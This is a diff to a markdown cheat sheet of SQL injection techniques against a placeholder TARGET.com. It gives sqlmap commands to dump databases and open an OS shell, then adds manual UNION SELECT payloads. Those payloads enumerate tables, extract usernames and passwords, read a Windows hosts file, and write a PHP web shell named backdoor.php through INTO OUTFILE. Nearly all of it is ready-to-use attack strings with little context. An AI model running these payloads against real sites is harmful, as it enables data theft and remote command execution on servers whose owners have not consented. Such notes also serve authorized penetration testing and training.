@@ -1,15 +1,66 @@
 #### sqlmap
 
 ```
-sqlmap -u http://TARGET.com/debug.php?id=1 -p "id"
-sqlmap -u http://TARGET.com/debug.php?id=1 -p "id" --dbms=mysql --dump
+sqlmap -u http://TARGET.com/index.php?id=1 -p "id"
+sqlmap -u http://TARGET.com/index.php?id=1 -p "id" --dbms=mysql --dump
 ```
 
 **attempt to launch shell**
 ```
-sqlmap -u http://TARGET.com/debug.php?id=1 -p "id" --dbms=mysql --os-shell
+sqlmap -u http://TARGET.com/index.php?id=1 -p "id" --dbms=mysql --os-shell
 ```
 
+#### Iterate process in burp
+
+union to find cols being displayed
+
+```
+http://TARGET.COM/index.php?id=2 union all select 1, 2, 3
+
+```
+version
+
+```
+http://TARGET.COM/index.php?id=1 union all select 1, 2, @@version
+http://TARGET.COM/index.php?id=2%20union%20all%20select%201,%202,%20@@version
+
+```
+user
+
+```
+http://TARGET.COM/index.php?id=1 union all select 1, 2,user()
+
+```
+table names
+
+```
+http://TARGET.COM/index.php?id=1 union all select 1, 2, table_name from information_schema.tables
+
+```
+user table
+
+```
+http://TARGET.COM/index.php?id=1 union all select 1, 2, column_name from information_schema.columns where table_name='users'
+
+```
+extract user name and passwords
+
+```
+http://TARGET.COM/index.php?id=1 union all select 1, username, password from users
+
+```
+load file
+
+```
+http://TARGET.COM/index.php??id=1 union all select 1, 2, load_file('C:/Windows/System32/drivers/etc/hosts')
+
+```
+create file using INTO OUTFILE
+
+```
+http://TARGET.COM/index.php?id=1 union all select 1, 2, "<?php echo shell_exec($_GET['cmd']);?>" into OUTFILE 'c:/xampp/htdocs/backdoor.php'
+
+```
 
 #### SQL Injection
 
